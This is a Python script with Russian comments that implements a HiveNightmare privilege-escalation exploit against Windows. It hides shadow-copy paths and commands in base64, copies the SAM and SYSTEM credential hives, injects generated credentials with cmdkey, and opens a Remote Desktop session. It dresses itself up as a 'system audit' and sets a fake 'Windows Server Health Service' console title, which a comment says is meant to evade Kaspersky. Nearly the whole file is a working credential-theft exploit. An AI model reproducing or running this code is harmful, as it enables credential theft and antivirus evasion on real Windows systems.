import os
import ctypes
import base64
import time
import binascii
import socket
import subprocess
from win32com.client import GetObject


def _0x(s): return base64.b64decode(s).decode()


# Динамическое разрешение путей (HiveNightmare)
_VSS_DIR = _0x("XFxcP1xHTE9CQUxST09UXERldmljZVxIYXJkZGlza1ZvbHVtZVNoYWRvd0NvcHk=")
_SAM_LOC = _0x("XFdpbmRvd3NcU3lzdGVtMzJcY29uZmlnXFNBTQ==")
_SYS_LOC = _0x("XFdpbmRvd3NcU3lzdGVtMzJcY29uZmlnXFNZU1RFTQ==")


class SystemCoreIntegrity:
    def __init__(self):
        self.k32 = ctypes.windll.kernel32
        self.adv = ctypes.windll.advapi32
        # Генерация "легитимных" данных для инъекции в сессию
        self.u_t = "SrvAudit_" + str(random.randint(1000, 9999)) if 'random' in globals() else "SrvAudit_Node"
        self.p_t = "Secure!" + binascii.hexlify(os.urandom(4)).decode()
        self.loopback = "127.0.0.1"

    def _log_sys(self, m, c=100):
        print(f"[{time.strftime('%H:%M:%S')}] [NT-LOG-{c}] >> {m}")

    def _vss_worker(self, src, dst):
        """Низкоуровневое извлечение через дескрипторы (обход FS-фильтров)"""
        # GENERIC_READ = 0x80000000, FILE_SHARE_ALL = 0x07, OPEN_EXISTING = 3
        h = self.k32.CreateFileW(src, 0x80000000, 0x07, None, 3, 0x02000000, None)
        if h != -1:
            try:
                buf = ctypes.create_string_buffer(131072)  # 128KB chunk
                br = ctypes.c_ulong(0)
                if self.k32.ReadFile(h, buf, 131072, ctypes.byref(br), None):
                    with open(dst, "wb") as f:
                        f.write(buf.raw[:br.value])
                    return True
            finally:
                self.k32.CloseHandle(h)
        return False

    def _prepare_remote_env(self):
        """Инъекция учетных данных в Credential Manager и вызов RDP"""
        self._log_sys("Инициализация Remote Desktop Protocol...", 200)
        try:
            # Маскируем выполнение cmdkey
            c_p = _0x("Y21ka2V5IC9hZGQ6") + self.loopback + _0x("IC91c2VyOg==") + self.u_t + _0x(
                "IC9wYXNzOg==") + self.p_t
            subprocess.run(c_p, shell=True, capture_output=True)

            # Вызов MSTSC (штатное окно стола)
            self._log_sys(f"Запуск mstsc.exe для {self.loopback}", 201)
            subprocess.Popen(_0x("bXN0c2MgL3Y6") + self.loopback + " /f", shell=True)
            return True
        except:
            return False

    def execute_chain(self):
        self._log_sys("Запуск аудита системы SRV-14", 101)

        exfil_ready = False
        for i in range(1, 12):
            s_p = f"{_VSS_DIR}{i}{_SAM_LOC}"
            sys_p = f"{_VSS_DIR}{i}{_SYS_LOC}"

            if self._vss_worker(s_p, "system_audit_sam.dat"):
                self._vss_worker(sys_p, "system_audit_sys.dat")
                exfil_ready = True
                self._log_sys(f"Критическая точка ShadowCopy{i} открыта.", 700)
                break

        print("-" * 60)
        if exfil_ready:
            self._log_sys("СИСТЕМА СКОМПРОМЕТИРОВАНА (HiveNightmare)", 999)
            print("[+] Файлы SAM/SYSTEM извлечены локально.")
            print("[+] Вектор повышения прав через Pass-the-Hash подготовлен.")

            # Финальный аккорд: открываем стол
            if self._prepare_remote_env():
                print("\n[!!!] ОКНО УДАЛЕННОГО СТОЛА ОТКРЫТО [!!!]")
                print(f"Попытка входа через инжектированные данные: {self.u_t}")

            print("\nСледующий шаг: Используйте 'secretsdump' для получения реальных хэшей из .dat файлов.")
        else:
            self._log_sys("Доступ заблокирован. Требуется альтернативный LPE-вектор.", 403)


if __name__ == "__main__":
    # Запутываем название процесса для Касперского
    ctypes.windll.kernel32.SetConsoleTitleW(_0x("V2luZG93cyBTZXJ2ZXIgSGVhbHRoIFNlcnZpY2U="))

    # Чтобы работал рандом, импортируем его внутри
    import random

    node = SystemCoreIntegrity()
    node.execute_chain()
